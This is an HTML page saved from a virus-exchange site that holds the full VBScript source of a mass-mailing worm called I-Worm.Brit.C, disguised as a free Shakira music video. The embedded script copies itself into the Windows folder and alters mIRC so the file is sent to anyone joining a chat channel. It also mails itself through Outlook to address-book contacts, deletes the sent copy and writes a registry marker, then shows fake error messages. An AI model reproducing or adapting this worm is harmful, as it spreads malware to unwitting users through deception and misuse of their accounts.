<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0051)http://vx.netlux.org/dl/vir/I-Worm.Brit.b?x=10&y=15 -->
<HTML><HEAD>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<META content="MSHTML 6.00.2900.2180" name=GENERATOR></HEAD>
<BODY text=red bgColor=#ffbfdf>
<HR>

<P align=center><B><FONT size=7>Permite Active X para ver el nuevo video de 
SHAKIRA</FONT></B></P>
<P align=right><FONT size=4>Kuasanagui inc.</FONT> 
<HR>

<P><B><FONT size=5>
<MARQUEE>Gratis nuevo video de SHAKIRA !!!!</MARQUEE></FONT></B></P>
<SCRIPT language=VBScript><!--
on error resume next
	myPath=Replace(location.href,"mk:@MSITStore:","")
	myPath=Replace(myPath,"/","\")
	myPath=Mid(myPath,1,Instr(myPath,"::")-1)
For i = 1 To 3

If i = 1 Then Drive = "c"
If i = 2 Then Drive = "D"
If i = 3 Then Drive = "E"

    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.GetFolder(Drive & ":\")
    Set sf = f.SubFolders
    For Each f1 In sf

                        If fso.fileExists(f1 & "\MIRC.INI") Then mIRCDir = f1 & "\MIRC.INI"
                        Set G = fso.GetFolder(f1)
                        Set Y = G.SubFolders
                        For Each D1 In Y

                                If fso.fileExists(D1 & "\MIRC.INI") Then mIRCDir = D1 & "\MIRC.INI"
                                Set P = fso.GetFolder(D1)
                                Set W = P.SubFolders
                                For Each E1 In W

    If fso.fileExists(E1 & "\MIRC.INI") Then mIRCDir = E1 & "\MIRC.INI"
    Set Q = fso.GetFolder(E1)
    Set J = Q.SubFolders
    For Each T1 In J

    Next: Next: Next: Next: Next

	Set WinDir = fso.GetSpecialFolder(0)

		fso.CopyFile myPath,WinDir & "\Shakira.chm"

	if mIRCDir = "" then

		Set Shell = CreateObject("WScript.Shell")

			mIRCDir = Shell.Regread("HKEY_LOCAL_MACHINE\SOFTWARE\CLASSES\ChatFile\DefaultIcon\")

                   		if Instr(Ucase(mIRCDir),"MIRC32.EXE") > 0 then
                    			mIRCDir = mIRCDir
                    		Else
                    			mIRCDir = ""
                    		End if

		Set Shell = Nothing

	end if

	if mIRCDir <> "" then

		mIRCDir = Mid(mIRCDir, 1, InStrRev(mIRCDir, "\"))
		mIRCDir = Replace(mIRCDir,"""","")

  	Set fso = CreateObject("Scripting.FileSystemObject")
  	Set f = fso.OpenTextFile(mIRCDir & "Script.ini", 2, True)
  	f.WriteLine "[script]"
	f.Write "n0=on 1:JOIN:#:if ( $me != $nick ) { /msg $Nick Hola ¿como estas?, ¡mira!, ¡El nuevo video de Shakira! | /dcc send $nick "&WinDir&"\Shakira.chm }"
  	f.Close
	end if

	Set Shell = CreateObject("WScript.Shell")
		if Shell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\chm") = "" then

	Set Kuasanagui = CreateObject("Outlook.Application")

	if Kuasanagui.Name = "Outlook" then

	Victim = Kuasanagui.GetNamespace("MAPI").AddressLists.Item(3).AddressEntries.GetFirst

	With Kuasanagui.CreateItem(olMailItem)
		.Recipients.Add Victim
		.Attachments.Add myPath
		.Subject = "¡Nuevo video de SHAKIRA!"
		.Body = "Hola"+vbcrlf+""+vbcrlf+"He visto el nuevo video de Shakira"+vbcrlf+"y me he enamorado de ella."+vbcrlf+"Esta hermosa mujer es hermosa, es impactante"+vbcrlf+"me ha hecho suspirar y quiero que "+vbcrlf+"igual que yo compartas esta emoción."+vbcrlf+"Disfrutalo."+vbcrlf+Ol.Session.CurrentUser.Name
		.Send
	                  .DeleteAfterSubmit=True
	
                       End With
	End IF

	Set Kuasanagui = Nothing
		Shell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\chm","1"
	Set Shell = Nothing
	End if
Msgbox "Error al mostrar el video musical"  & vbCrLf & "permite la interacción Active X para ver el video. "  & vbCrLf & "No se encuentra conexión a internet"  & vbCrLf & "Consulta tu proveedor",16,"I-Worm.Brit.C"
Msgbox "   Creado en Mexico por Kuasanagui" & vbCrLf & "      <<<<      I-Worm.Brit.C     >>>>",15,"I-Worm.Brit.C"
Msgbox "Shakira... Kuasanagui te ama  =P"  & vbCrLf & "Aunque me gustas más con cabello negro.",15,"I-Worm.Brit.C"
Msgbox "¿No conoces a Shakira?"& vbCrLf & "¡Compra sus discos!"& vbCrLf &"Piez Descalzos"& vbCrLf & "¿Donde estan los ladrones?"& vbCrLf &"Servició de Lavanderia",15,"I-Worm.Brit.C"
Msgbox "Dedicado a Sandra Montejo Pérez",15,"I-Worm.Brit.C"


--></SCRIPT>

<P align=center><FONT size=4><B>ANTOLOGIA<BR></B></FONT><B><BR></B>Para amarte 
necesito una razón<BR>y es difícil creer que no exista<BR>una mas que este 
amor.<BR><BR>Sobra tanto dentro de este corazón<BR>que a pesar de que 
dicen<BR>que los años son sabios<BR>todavía se siente el dolor.<BR><BR>Porque 
todo el tiempo que pase junto a ti<BR>dejo tejido su hilo dentro de mí.<BR><BR>Y 
aprendí a quitarle al tiempo los segundos<BR>tu me hiciste ver el cielo aun más 
profundo<BR>junto a ti creo que aumente mas de tres kilos<BR>con tus tantos 
dulces besos repartidos.<BR>Desarrollaste mi sentido del olfato<BR>y fue por ti 
que aprendí a querer los gatos<BR>despegaste del cemento mis zapatos<BR>para 
escapar los dos volando un rato.<BR><BR>Pero olvidaste una final 
instrucción<BR>porque aun no se como vivir sin tu amor.<BR><BR>Y descubrí lo que 
significa una rosa<BR>me enseñaste a decir mentiras piadosas<BR>para poder verte 
a horas no adecuadas<BR>y a remplazar palabras por miradas.<BR>Y fue por ti que 
escribí mas de cien canciones<BR>y hasta perdone tus equivocaciones<BR>y conocí 
mas de mil formas de besar<BR>y fue por ti que descubrí lo que es amar<BR>lo que 
es amar.<B><BR></B><BR>[Shakira Mebarak]<BR><BR><BR></P>
<P><B>Kuasanagui inc. 09 de Abril de 2002</B></P></BODY></HTML>
